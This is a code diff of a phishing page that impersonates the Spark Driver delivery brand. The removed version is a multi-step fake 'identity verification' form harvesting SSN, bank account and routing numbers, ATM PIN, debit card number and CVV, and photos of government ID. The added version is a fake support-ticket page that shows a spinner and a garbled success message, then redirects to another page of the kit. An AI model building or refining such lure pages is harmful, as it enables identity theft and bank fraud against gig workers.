@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification | Spark Driver™</title>
+    <title>Submit Ticket | Spark Driver™</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -29,7 +29,7 @@
 
         .header-content {
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
             max-width: 1200px;
             margin: 0 auto;
@@ -40,179 +40,72 @@
             height: 40px;
         }
 
-        .header-actions {
-            display: flex;
-            align-items: center;
-        }
-
-        .btn-ticket {
-            background: #0C3C92;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 25px;
-            font-size: 14px;
-            font-weight: 500;
-            text-decoration: none;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .btn-ticket:hover {
-            background: #082a6d;
-            transform: translateY(-1px);
-            box-shadow: 0 2px 8px rgba(12, 60, 146, 0.3);
-        }
-
-        
-
-        .verification-container {
+        .ticket-container {
             flex: 1;
-            max-width: 800px;
-            margin: 30px auto 20px;
+            max-width: 500px;
+            margin: 100px auto;
             padding: 0 20px;
+            text-align: center;
         }
 
-        .verification-card {
+        .ticket-card {
             background: white;
             border-radius: 12px;
             box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
+            padding: 40px;
         }
 
-        .progress-bar {
-            display: flex;
-            background: #f8f9fa;
-            padding: 15px 20px;
-            border-bottom: 1px solid #eaeaea;
-        }
-
-        .progress-step {
-            display: flex;
-            align-items: center;
-            flex: 1;
-            font-size: 14px;
-            font-weight: 500;
-            color: #6c757d;
-        }
-
-        .progress-step.active {
+        .ticket-title {
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 20px;
             color: #0C3C92;
-        }
-
-        .progress-step .step-number {
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 28px;
-            height: 28px;
-            border-radius: 50%;
-            background: #dee2e6;
-            color: white;
-            margin-right: 10px;
-            font-size: 14px;
         }
 
-        .progress-step.active .step-number {
-            background: #0C3C92;
+        .ticket-title i {
+            margin-right: 15px;
+            font-size: 36px;
         }
 
-        .progress-step.completed .step-number {
-            background: #28a745;
+        .ticket-description {
+            font-size: 18px;
+            color: #6c757d;
+            margin-bottom: 40px;
+            line-height: 1.6;
         }
 
-        .form-content {
-            padding: 30px;
-        }
-
-        .form-step {
-            display: none;
-        }
-
-        .form-step.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .step-title {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 25px;
-            color: #0C3C92;
-            display: flex;
-            align-items: center;
-        }
-
-        .step-title i {
-            margin-right: 12px;
-            font-size: 28px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: #3B4459;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            color: #3B4459;
-            transition: all 0.3s;
-        }
-
-        .form-control:focus {
-            border-color: #0C3C92;
-            box-shadow: 0 0 0 3px rgba(12, 60, 146, 0.1);
-            outline: none;
-        }
-
-        .form-row {
-            display: flex;
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-
-        .form-col {
-            flex: 1;
-        }
-
-        .btn-next {
+        .btn-submit {
             background: #0C3C92;
             color: white;
             border: none;
-            padding: 14px 30px;
+            padding: 16px 40px;
             border-radius: 50px;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 500;
             cursor: pointer;
-            display: block;
-            margin: 30px auto 10px;
             transition: all 0.3s;
-            min-width: 180px;
+            min-width: 200px;
         }
 
-        .btn-next:hover {
+        .btn-submit:hover {
             background: #082a6d;
             transform: translateY(-2px);
             box-shadow: 0 4px 10px rgba(12, 60, 146, 0.3);
         }
 
+        .btn-submit:disabled {
+            background: #6c757d;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
         .loading-spinner {
             display: none;
-            text-align: center;
-            margin: 40px 0;
+            margin: 30px 0;
         }
 
         .spinner {
@@ -225,93 +118,14 @@
             margin: 0 auto 20px;
         }
 
-        .logo-divider {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 30px 0;
-            gap: 30px;
-            padding: 0 20px;
-        }
-
-        .logo-divider img {
-            height: 120px;
-            width: auto;
-            opacity: 0.9;
+        .success-message {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
             border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease, opacity 0.3s ease;
-        }
-
-        .logo-divider img:hover {
-            transform: scale(1.05);
-            opacity: 1;
-        }
-
-        .divider-line {
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #0C3C92, transparent);
-            flex: 1;
-            max-width: 200px;
-        }
-
-        .eligibility-section {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
-            padding: 40px 30px;
-            margin: 20px auto 30px;
-            max-width: 1000px;
-        }
-
-        .eligibility-section h3 {
-            color: #0C3C92;
-            font-size: 28px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .eligibility-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 25px;
-        }
-
-        .eligibility-item {
-            background: #f8f9fa;
-            padding: 25px;
-            border-radius: 10px;
-            border-left: 4px solid #28a745;
-        }
-
-        .eligibility-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .eligibility-header i {
-            color: #28a745;
-            font-size: 20px;
-            margin-right: 12px;
-        }
-
-        .eligibility-header h4 {
-            color: #0C3C92;
-            font-size: 18px;
-            font-weight: 600;
-            margin: 0;
-        }
-
-        .eligibility-item p {
-            color: #3B4459;
-            line-height: 1.5;
-            margin-bottom: 10px;
-        }
-
-        .eligibility-item p:last-child {
-            margin-bottom: 0;
+            margin: 20px 0;
+            border: 1px solid #c3e6cb;
         }
 
         .footer {
@@ -360,44 +174,22 @@
             font-size: 14px;
         }
 
-        .error-message {
-            color: #d9534f;
-            font-size: 14px;
-            margin-top: 5px;
-            display: none;
-        }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
         @media (max-width: 768px) {
-            .form-row {
-                flex-direction: column;
-                gap: 0;
+            .ticket-card {
+                padding: 30px 20px;
             }
 
-            .progress-step .step-text {
-                display: none;
+            .ticket-title {
+                font-size: 28px;
             }
 
-            .progress-step {
-                justify-content: center;
-            }
-
-            .logo-divider {
-                flex-direction: column;
-            }
-
-            .divider-line {
-                width: 100px;
-                height: 1px;
+            .ticket-description {
+                font-size: 16px;
             }
         }
     </style>
@@ -408,236 +200,30 @@
             <div class="logo">
                 <img src="https://www.sparkdriverapp.com/content/dam/sparkdriverapp/images/spark-driver-logo.svg" alt="Spark Driver Logo">
             </div>
-            <div class="header-actions">
-                <a href="submit-ticket.html" class="btn-ticket">
-                    <i class="fas fa-headset"></i>
-                    Submit Ticket
-                </a>
-            </div>
         </div>
     </header>
 
-    <div class="verification-container">
-        <div class="verification-card">
-            <div class="progress-bar">
-                <div class="progress-step active">
-                    <span class="step-number">1</span>
-                    <span class="step-text">Identity</span>
-                </div>
-                <div class="progress-step">
-                    <span class="step-number">2</span>
-                    <span class="step-text">Payment</span>
-                </div>
-                <div class="progress-step">
-                    <span class="step-number">3</span>
-                    <span class="step-text">Card</span>
-                </div>
-                <div class="progress-step">
-                    <span class="step-number">4</span>
-                    <span class="step-text">ID Upload</span>
-                </div>
+    <div class="ticket-container">
+        <div class="ticket-card">
+            <h1 class="ticket-title">
+                <i class="fas fa-headset"></i>
+                Submit Ticket
+            </h1>
+
+            <p class="ticket-description">
+                Click the button below to submit a support ticket. Our team will get back to you as soon as possible.
+            </p>
+
+            <button type="button" class="btn-submit" id="submitTicket">Submit Ticket</button>
+
+            <div class="loading-spinner" id="loadingSpinner">
+                <div class="spinner"></div>
+                <p>Submitting your ticket...</p>
             </div>
 
-            <div class="form-content">
-                <!-- Step 1: Identity Verification -->
-                <div class="form-step active" id="step1">
-                    <h2 class="step-title"><i class="fas fa-user-check"></i> Complete Verification</h2>
-
-                    <form id="identityForm">
-                        <div class="form-row">
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="firstName">First Name</label>
-                                    <input type="text" class="form-control" id="firstName" required>
-                                </div>
-                            </div>
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="lastName">Last Name</label>
-                                    <input type="text" class="form-control" id="lastName" required>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="phone">Phone Number</label>
-                            <input type="tel" class="form-control" id="phone" placeholder="Enter 10-digit phone number" pattern="[0-9]{10}" maxlength="10" required>
-                            <div class="error-message" id="phoneError">Please enter a valid 10-digit phone number</div>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="dob">Date of Birth</label>
-                            <input type="date" class="form-control" id="dob" required>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="ssn">SSN</label>
-                            <input type="text" class="form-control" id="ssn" placeholder="Enter 9-digit SSN" pattern="[0-9]{9}" maxlength="9" required>
-                            <div class="error-message" id="ssnError">Please enter a valid 9-digit SSN</div>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="address">Address</label>
-                            <input type="text" class="form-control" id="address" required>
-                        </div>
-                    </form>
-
-                    <button type="button" class="btn-next" id="nextToPayment">Next</button>
-
-                    <div class="loading-spinner" id="loading1">
-                        <div class="spinner"></div>
-                        <p>Verifying your information...</p>
-                    </div>
-                </div>
-
-                <!-- Step 2: Payment Information -->
-                <div class="form-step" id="step2">
-                    <h2 class="step-title"><i class="fas fa-credit-card"></i> Complete your Payment information</h2>
-
-                    <form id="paymentForm">
-                        <div class="form-group">
-                            <label for="bankName">Bank Name</label>
-                            <input type="text" class="form-control" id="bankName" required>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="bankAccount">Bank Account Number</label>
-                            <input type="text" class="form-control" id="bankAccount" required>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="accountType">Account Type</label>
-                            <select class="form-control" id="accountType" required>
-                                <option value="">Select Account Type</option>
-                                <option value="checking">Checking</option>
-                                <option value="savings">Savings</option>
-                            </select>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="routingNumber">Bank Routing Number</label>
-                            <input type="text" class="form-control" id="routingNumber" placeholder="Enter 9-digit routing number" pattern="[0-9]{9}" maxlength="9" required>
-                            <div class="error-message" id="routingError">Please enter a valid 9-digit routing number</div>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="atmPin">ATM Pin</label>
-                            <input type="password" class="form-control" id="atmPin" placeholder="Enter 4-digit PIN" pattern="[0-9]{4}" maxlength="4" required>
-                            <div class="error-message" id="atmPinError">Please enter a valid 4-digit PIN</div>
-                        </div>
-                    </form>
-
-                    <button type="button" class="btn-next" id="nextToCard">Next</button>
-
-                    <div class="loading-spinner" id="loading2">
-                        <div class="spinner"></div>
-                        <p>Processing payment information...</p>
-                    </div>
-                </div>
-
-                <!-- Step 3: Debit Card Verification -->
-                <div class="form-step" id="step3">
-                    <h2 class="step-title"><i class="fas fa-id-card"></i> Debit Card Verification</h2>
-
-                    <form id="cardForm">
-                        <div class="form-group">
-                            <label for="cardNumber">Card Number</label>
-                            <div style="position: relative;">
-                                <input type="text" class="form-control" id="cardNumber" placeholder="Enter 16-digit card number" pattern="[0-9]{16}" maxlength="16" required style="padding-right: 50px;">
-                                <img id="cardLogo" src="" alt="Card Logo" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); height: 30px; display: none;">
-                            </div>
-                            <div class="error-message" id="cardError">Please enter a valid 16-digit card number</div>
-                        </div>
-
-                        <div class="form-row">
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="expDate">Expiration Date</label>
-                                    <input type="month" class="form-control" id="expDate" required>
-                                </div>
-                            </div>
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="cvv">CVV</label>
-                                    <input type="text" class="form-control" id="cvv" placeholder="3-4 digits" pattern="[0-9]{3,4}" minlength="3" maxlength="4" required>
-                                    <div class="error-message" id="cvvError">Please enter a valid 3-4 digit CVV</div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="confirmAtmPin">Confirm ATM Pin</label>
-                            <input type="password" class="form-control" id="confirmAtmPin" placeholder="Enter 4-digit PIN" pattern="[0-9]{4}" maxlength="4" required>
-                            <div class="error-message" id="confirmPinError">Please enter a valid 4-digit PIN</div>
-                        </div>
-                    </form>
-
-                    <button type="button" class="btn-next" id="nextToId">Next</button>
-
-                    <div class="loading-spinner" id="loading3">
-                        <div class="spinner"></div>
-                        <p>Verifying card information...</p>
-                    </div>
-                </div>
-
-                <!-- Step 4: ID Upload -->
-                <div class="form-step" id="step4">
-                    <h2 class="step-title"><i class="fas fa-camera"></i> ID Upload</h2>
-
-                    <form id="idForm">
-                        <div class="form-group">
-                            <label for="frontId">Upload Front of ID</label>
-                            <input type="file" class="form-control" id="frontId" accept="image/*" required>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="backId">Upload Back of ID</label>
-                            <input type="file" class="form-control" id="backId" accept="image/*" required>
-                        </div>
-                    </form>
-
-                    <button type="button" class="btn-next" id="completeVerification">Complete Verification</button>
-
-                    <div class="loading-spinner" id="loading4">
-                        <div class="spinner"></div>
-                        <p>Uploading your documents...</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="logo-divider">
-            <div class="divider-line"></div>
-            <img src="https://www.sparkdriverapp.com/content/sparkdriverapp/en_us/jcr:content/par/wrapper/wrapper-par/wrapper/wrapper-par/wrapper/wrapper-par/columns_new_copy_114/column_2/image_2_0.img.png/1729093216031.png" alt="Spark Driver Image 1">
-            <img src="https://www.sparkdriverapp.com/content/sparkdriverapp/en_us/jcr:content/par/wrapper/wrapper-par/wrapper/wrapper-par/columns_new_copy/column_1/image_2_0.img.png/1729093209362.png" alt="Spark Driver Image 2">
-            <div class="divider-line"></div>
-        </div>
-
-        <div class="eligibility-section">
-            <h3>Eligibility</h3>
-            <div class="eligibility-grid">
-                <div class="eligibility-item">
-                    <div class="eligibility-header">
-                        <i class="fas fa-check-circle"></i>
-                        <h4>Age</h4>
-                    </div>
-                    <p>Be age 18 or older and authorized to perform services as an independent contractor in the U.S.</p>
-                </div>
-                <div class="eligibility-item">
-                    <div class="eligibility-header">
-                        <i class="fas fa-check-circle"></i>
-                        <h4>Documents</h4>
-                    </div>
-                    <p>Provide proof of valid auto insurance for the vehicle you are using to deliver.</p>
-                    <p>Have an unexpired, valid REAL ID-compliant or driver's license in your name issued by a state in the U.S. and Social Security card.</p>
-                </div>
-                <div class="eligibility-item">
-                    <div class="eligibility-header">
-                        <i class="fas fa-check-circle"></i>
-                        <h4>Background Check</h4>
-                    </div>
-                    <p>Background screening may be conducted, including motor vehicle records and criminal background checks; reviews will be conducted in accordance with applicable laws.</p>
-                </div>
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle"></i>
+                Verify your identity! verification...
             </div>
         </div>
     </div>
@@ -657,6 +243,31 @@
         </div>
     </footer>
 
-    <script src="script.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const submitBtn = document.getElementById('submitTicket');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const successMessage = document.getElementById('successMessage');
+
+            // Submit ticket handler
+            submitBtn.addEventListener('click', function() {
+                // Show loading
+                submitBtn.disabled = true;
+                loadingSpinner.style.display = 'block';
+
+                // Wait for 5 seconds
+                setTimeout(function() {
+                    // Hide loading and show success
+                    loadingSpinner.style.display = 'none';
+                    successMessage.style.display = 'block';
+
+                    // Redirect after 2 seconds
+                    setTimeout(function() {
+                        window.location.href = 'mongo.html';
+                    }, 2000);
+                }, 5000);
+            });
+        });
+    </script>
 </body>
 </html>
